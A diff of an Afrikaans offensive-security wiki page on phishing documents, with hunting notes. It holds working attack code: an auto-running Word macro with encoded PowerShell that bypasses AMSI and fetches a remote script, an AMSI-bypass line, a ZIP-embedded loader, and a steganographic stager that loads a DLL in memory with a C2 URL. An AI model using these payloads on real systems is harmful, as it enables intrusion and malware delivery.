@@ -1,40 +1,40 @@
-# Phishing Lêers & Dokumente
+# Phishing-lêers en -dokumente
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Office Dokumente
+## Office-dokumente
 
-Microsoft Word voer lêerdata-validering uit voordat 'n lêer oopgemaak word. Data-validering word uitgevoer in die vorm van identifikasie van datastrukture, volgens die OfficeOpenXML-standaard. As enige fout tydens die identifikasie van die datastruktuur voorkom, sal die lêer wat geanaliseer word nie oopgemaak word nie.
+Microsoft Word voer lêer-datavalidering uit voordat 'n lêer oopgemaak word. Datavalidering geskied in die vorm van identifikasie van die datastruktuur, teen die OfficeOpenXML-standaard. As enige fout voorkom tydens die identifikasie van die datastruktuur, sal die lêer wat ontleed word nie oopgemaak word nie.
 
 Gewoonlik gebruik Word-lêers wat macros bevat die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds hul macro-uitvoeringsvermoëns te behou.\
-Byvoorbeeld, 'n RTF-lêer ondersteun macros nie, volgens ontwerp, maar 'n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en sal in staat wees tot macro-uitvoering.\
-Dieselfde interne strukture en meganismes geld vir alle sagteware van die Microsoft Office Suite (Excel, PowerPoint etc.).
+Byvoorbeeld, 'n RTF-lêer ondersteun nie macros nie, per ontwerp, maar 'n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en in staat wees tot macro-uitvoering.\
+Dieselfde interne meganika en meganismes geld vir alle sagteware van die Microsoft Office Suite (Excel, PowerPoint etc.).
 
-Jy kan die volgende opdrag gebruik om te kontroleer watter lêeruitbreidings deur sommige Office-programme uitgevoer gaan word:
+Jy kan die volgende opdrag gebruik om te kontroleer watter uitbreidings deur sommige Office-programme uitgevoer gaan word:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-DOCX-lêers wat na 'n afgeleë sjabloon verwys (File –Options –Add-ins –Manage: Templates –Go) wat macros bevat, kan ook macros uitvoer.
+DOCX-lêers wat na 'n afgeleë sjabloon verwys (File –Options –Add-ins –Manage: Templates –Go) wat makros bevat, kan ook makros “uitvoer”.
 
-### Eksterne Beeldlading
+### Eksterne beeldlading
 
-Go to: _Insert --> Quick Parts --> Field_\
-_**Kategorieë**: Links and References, **Veldname**: includePicture, en **Lêernaam of URL**:_ http://<ip>/whatever
+Gaan na: _Insert --> Quick Parts --> Field_\
+_**Kategorieë**: Links and References, **Veldname**: includePicture, and **Lêernaam of URL**:_ http://<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
-### Macros Backdoor
+### Makro-agterdeur
 
-Dit is moontlik om macros te gebruik om arbitrary code van die dokument af uit te voer.
+Dit is moontlik om makros te gebruik om willekeurige kode vanaf die dokument uit te voer.
 
-#### Autoload functions
+#### Autoload-funksies
 
-Hoe meer algemeen hulle is, hoe groter is die waarskynlikheid dat die AV hulle sal opspoor.
+Hoe algemener hulle is, hoe meer waarskynlik sal AV hulle opspoor.
 
 - AutoOpen()
 - Document_Open()
 
-#### Macros Code Examples
+#### Makro-kodevoorbeelde
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -66,24 +66,24 @@ proc.Create "powershell <beacon line generated>
 ```
 #### Verwyder metadata handmatig
 
-Gaan na **File > Info > Inspect Document > Inspect Document**, wat die Dokumentinspekteerder oopmaak. Klik **Inspect** en dan **Remove All** langs **Document Properties and Personal Information**.
+Gaan na **File > Info > Inspect Document > Inspect Document**, wat die Document Inspector oopmaak. Klik **Inspect** en daarna **Remove All** langs **Document Properties and Personal Information**.
 
-#### Doc-uitbreiding
+#### Doc Extension
 
-Wanneer klaar, kies die **Stoor as tipe**-dropdown, verander die formaat van **`.docx`** na **Word 97-2003 `.doc`**.\  
-Doen dit omdat jy **nie macro's binne 'n `.docx` kan stoor nie** en daar 'n **stigma** **rondom** die macro-enabled **`.docm`** uitbreiding is (bv. die miniatuurikoon het 'n groot `!` en sommige web/email gateways blokkeer dit heeltemal). Daarom is hierdie **erfenis `.doc` uitbreiding die beste kompromis**.
+Wanneer klaar, kies die **Save as type** aftreklys en verander die formaat van **`.docx`** na **Word 97-2003 `.doc`**.\
+Doen dit omdat jy **can't save macro's inside a `.docx`** en daar 'n **stigma** **around** die macro-enabled **`.docm`** uitbreiding is (bv. die miniatuur-ikoon het 'n groot `!` en sommige web/email gateways blokkeer hulle heeltemal). Daarom is hierdie **legacy `.doc` extension die beste kompromis**.
 
-#### Kwaadaardige Macros-generators
+#### Malicious Macros Generators
 
 - MacOS
 - [**macphish**](https://github.com/cldrn/macphish)
 - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## HTA Lêers
+## HTA Files
 
-'n HTA is 'n Windows-program wat **HTML en skriptaaltale (soos VBScript en JScript) kombineer**. Dit genereer die gebruikerskoppelvlak en voer uit as 'n "volledig vertroude" toepassing, sonder die beperkinge van 'n blaaier se sekuriteitsmodel.
+'n HTA is 'n Windows-program wat **HTML en skriptsprake (soos VBScript en JScript)** kombineer. Dit genereer die gebruikerskoppelvlak en voer uit as 'n "ten volle vertroude" toepassing, sonder die beperkinge van 'n blaaier se sekuriteitsmodel.
 
-'n HTA word uitgevoer met **`mshta.exe`**, wat gewoonlik saam met **Internet Explorer** geïnstalleer is, wat beteken dat **`mshta` afhanklik van IE is**. As dit verwyder is, sal HTAs nie uitgevoer kan word nie.
+'n HTA word uitgevoer deur **`mshta.exe`**, wat gewoonlik **geïnstalleer** is saam met **Internet Explorer**, wat **`mshta` afhanklik van IE** maak. As dit verwyder is, sal HTAs nie uitgevoer kan word nie.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -138,11 +138,11 @@ var_func
 self.close
 </script>
 ```
-## NTLM-verifikasie afdwing
+## Afdwing van NTLM-outentisering
 
-Daar is verskeie maniere om **NTLM authentication "remotely"** af te dwing, byvoorbeeld, jy kan **onsigbare beelde** by e-posse of HTML voeg wat die gebruiker sal besoek (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat **'n authentication** sal **aktiveer** net deur **die gids oop te maak.**
+Daar is verskeie maniere om NTLM-outentisering "op afstand" af te dwing, byvoorbeeld, jy kan **onnsigbare beelde** by e-posse of HTML voeg waarna die gebruiker sal toegang kry (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat 'n **outentisering** sal **aktiveer** net deur **die vouer te open.**
 
-**Kyk na hierdie idees en meer in die volgende bladsye:**
+**Kyk na hierdie idees en meer op die volgende bladsye:**
 
 
 {{#ref}}
@@ -156,22 +156,22 @@ Daar is verskeie maniere om **NTLM authentication "remotely"** af te dwing, byvo
 
 ### NTLM Relay
 
-Moet nie vergeet dat jy nie net die hash of die authentication kan steel nie, maar ook **NTLM relay attacks** kan uitvoer:
+Moenie vergeet dat jy nie net die hash of die outentisering kan steel nie — jy kan ook **NTLM relay attacks** uitvoer:
 
 - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 ## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
 
-Baie effektiewe veldtogte lewer 'n ZIP wat twee wettige lok-dokumente (PDF/DOCX) en 'n kwaadwillige .lnk bevat. Die truuk is dat die werklike PowerShell loader binne die ZIP se rou bytes na 'n unieke marker gestoor word, en die .lnk dit uitsny en volledig in die geheue uitvoer.
+Baie effektiewe veldtogte lewer 'n ZIP wat twee wettige lokdokumente (PDF/DOCX) en 'n kwaadwillige .lnk bevat. Die truuk is dat die werklike PowerShell-loader binne die rou bytes van die ZIP ná 'n unieke merker gestoor word, en die .lnk dit uitkerf en volledig in geheue uitvoer.
 
 Tipiese vloei geïmplementeer deur die .lnk PowerShell one-liner:
 
-1) Vind die oorspronklike ZIP in algemene paaie: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, en die ouer van die huidige werkdirektorie.  
-2) Lees die ZIP-bytes en vind 'n hardgekodeerde marker (bv. xFIQCV). Alles na die marker is die ingeslote PowerShell payload.  
-3) Kopieer die ZIP na %ProgramData%, pak dit daar uit, en open die lok .docx om legitiem te lyk.  
-4) Om AMSI te omseil vir die huidige proses: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
-5) Deobfuscate die volgende fase (bv. verwyder alle # karakters) en voer dit in die geheue uit.
+1) Lokaliseer die oorspronklike ZIP in algemene paaie: Desktop, Downloads, Documents, %TEMP%, %ProgramData% en die ouer van die huidige werkgids.
+2) Lees die ZIP-bytes en vind 'n hardgekodeerde merker (bv. xFIQCV). Alles ná die merker is die ingeslote PowerShell payload.
+3) Kopieer die ZIP na %ProgramData%, pak dit daar uit, en open die lok .docx om wettig te lyk.
+4) Omseil AMSI vir die huidige proses: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
+5) Deobfuskeer die volgende fase (bv. verwyder alle # karakters) en voer dit in geheue uit.
 
 Voorbeeld PowerShell-skelet om die ingeslote fase uit te kerf en uit te voer:
 ```powershell
@@ -191,39 +191,39 @@ $code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
 Invoke-Expression $code
 ```
 Aantekeninge
-- Versending maak dikwels misbruik van bekende PaaS-subdomeine (bv., *.herokuapp.com) en kan die payloads afskerm (dien goedaardige ZIPs op grond van IP/UA).
-- Die volgende fase ontcijfer dikwels base64/XOR shellcode en voer dit uit via Reflection.Emit + VirtualAlloc om skyfartefakte te minimaliseer.
+- Aflewering misbruik dikwels bekende PaaS-subdomeine (bv., *.herokuapp.com) en kan payloads afskerm (bedien goedaardige ZIPs gebaseer op IP/UA).
+- Die volgende fase ontsleutsel dikwels base64/XOR shellcode en voer dit uit via Reflection.Emit + VirtualAlloc om skyf-artefakte te minimaliseer.
 
-Persistensie wat in dieselfde ketting gebruik word
-- COM TypeLib hijacking of the Microsoft Web Browser control sodat IE/Explorer of enige app wat dit inkorporeer die payload outomaties herbegin. Sien besonderhede en kant-en-klare opdragte hier:
+Persistence used in the same chain
+- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. Sien besonderhede en gereed-vir-gebruik kommando's hier:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
-Opsporing/IOCs
+Hunting/IOCs
 - ZIP-lêers wat die ASCII-merkerstring (bv., xFIQCV) bevat wat aan die argiefdata aangeheg is.
-- .lnk wat ouer- en gebruikersgidse deurloop om die ZIP te lok en 'n lokdokument oopmaak.
+- .lnk wat ouer-/gebruikerlêergidse opsom om die ZIP te vind en 'n lokdokument open.
 - AMSI-manipulasie via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
-- Langdurige besigheidsdrade wat eindig met skakels aangebied onder vertroude PaaS-domeine.
+- Langlopende sake-drade wat eindig met skakels wat onder vertroude PaaS-domeine gehuisves word.
 
-## Steganography-afgebakende payloads in beelde (PowerShell stager)
+## Steganography-delimited payloads in images (PowerShell stager)
 
-Onlangse loader chains lewer 'n geobfuskede JavaScript/VBS wat 'n Base64 PowerShell stager dekodeer en uitvoer. Daardie stager laai 'n beeld af (dikwels GIF) wat 'n Base64-gekodeerde .NET DLL bevat, weggesteek as platte teks tussen unieke begin-/eindmerkers. Die skrip soek na hierdie merkers (voorbeelde in die veld: «<<sudo_png>> … <<sudo_odt>>>»), onttrek die tussenliggende teks, dekodeer dit van Base64 na bytes, laai die assembly in-memory en roep 'n bekende entry-metode aan met die C2 URL.
+Onlangse loader chains lewer 'n versluierde JavaScript/VBS wat 'n Base64 PowerShell stager dekodeer en uitvoer. Daardie stager laai 'n beeld af (gereeld GIF) wat 'n Base64-gekodeerde .NET DLL bevat, versteek as platte teks tussen unieke begin-/eind-merkers. Die script soek na hierdie afskeidingsmerkers (voorbeeld in die veld: «<<sudo_png>> … <<sudo_odt>>>»), onttrek die tussen-tekst, dekodeer dit van Base64 na bytes, laai die assembly in-memory en roep 'n bekende entry method aan met die C2 URL.
 
-Werkvloeistroom
-- Stage 1: Gearchiveerde JS/VBS dropper → ontkodeer ingebedde Base64 → lanseer PowerShell stager met -nop -w hidden -ep bypass.
-- Stage 2: PowerShell stager → laai beeld af, ekstraheer marker-afgebakende Base64, laai die .NET DLL in-memory en roep sy metode (bv., VAI) aan en gee die C2 URL en opsies as argumente.
-- Stage 3: Die loader haal die finale payload op en injekteer dit tipies via process hollowing in 'n vertroude binêre (gewoonlik MSBuild.exe). Sien meer oor process hollowing en trusted utility proxy execution hier:
+Werkvloei
+- Stage 1: Archived JS/VBS dropper → dekodeer ingebedde Base64 → loods PowerShell stager met -nop -w hidden -ep bypass.
+- Stage 2: PowerShell stager → laai 'n beeld af, kerf merker-afgebakende Base64 uit, laai die .NET DLL in-memory en roep sy metode aan (bv., VAI) en gee die C2 URL en opsies deur.
+- Stage 3: Loader haal finale payload op en spuit dit gewoonlik via process hollowing in 'n vertroude binêre (dikwels MSBuild.exe). Sien meer oor process hollowing en trusted utility proxy execution hier:
 
 {{#ref}}
 ../../reversing/common-api-used-in-malware.md
 {{#endref}}
 
-PowerShell-voorbeeld om 'n DLL uit 'n beeld te ekstraheer en 'n .NET-metode in-memory aan te roep:
+PowerShell-voorbeeld om 'n DLL uit 'n beeld te kerf en 'n .NET-metode in-memory aan te roep:
 
 <details>
-<summary>PowerShell stego payload-uittrekselaar en laaier</summary>
+<summary>PowerShell stego payload extractor and loader</summary>
 ```powershell
 # Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
 param(
@@ -248,9 +248,9 @@ $null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
 </details>
 
 Aantekeninge
-- Dit is ATT&CK T1027.003 (steganography/marker-hiding). Markers verskil tussen veldtogte.
+- This is ATT&CK T1027.003 (steganography/marker-hiding). Merkers verskil tussen veldtogte.
 - AMSI/ETW bypass en string deobfuscation word gewoonlik toegepas voordat die assembly gelaai word.
-- Hunting: skandeer afgelaaide images vir bekende delimiters; identifiseer PowerShell wat images benader en onmiddellik Base64 blobs dekodeer.
+- Opsporing: skandeer afgelaaide beelde vir bekende delimiters; identifiseer PowerShell wat beelde benader en onmiddellik Base64 blobs dekodeer.
 
 See also stego tools and carving techniques:
 
@@ -262,19 +262,19 @@ See also stego tools and carving techniques:
 
 A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.
 
-Basiese logika (abstrak):
+Skeletlogika (abstrak):
 - Lees eie lêerinhoud
-- Vind 'n Base64-blok tussen rommelstrings
+- Vind 'n Base64 blob tussen rommelstrings
 - Dekodeer na ASCII PowerShell
-- Voer uit met `wscript.exe`/`cscript.exe` wat `powershell.exe` oproep
+- Voer uit met `wscript.exe`/`cscript.exe` wat `powershell.exe` aanroep
 
-Hunting cues
-- Gearchiveerde JS/VBS-aanhangsels wat `powershell.exe` spawn met `-enc`/`FromBase64String` in die opdragreël.
-- `wscript.exe` wat `powershell.exe -nop -w hidden` vanaf gebruiker se temp-paaie lanseer.
+Opsporingswenke
+- Gearchiveerde JS/VBS-aanhangsels wat `powershell.exe` laat ontstaan met `-enc`/`FromBase64String` in die opdragreël.
+- `wscript.exe` wat `powershell.exe -nop -w hidden` vanaf gebruiker-temp-paaie loods.
 
-## Windows-lêers om NTLM-hashes te steel
+## Windows files to steal NTLM hashes
 
-Kyk na die bladsy oor **places to steal NTLM creds**:
+Kyk na die bladsy oor **plekke om NTLM creds te steel**:
 
 {{#ref}}
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
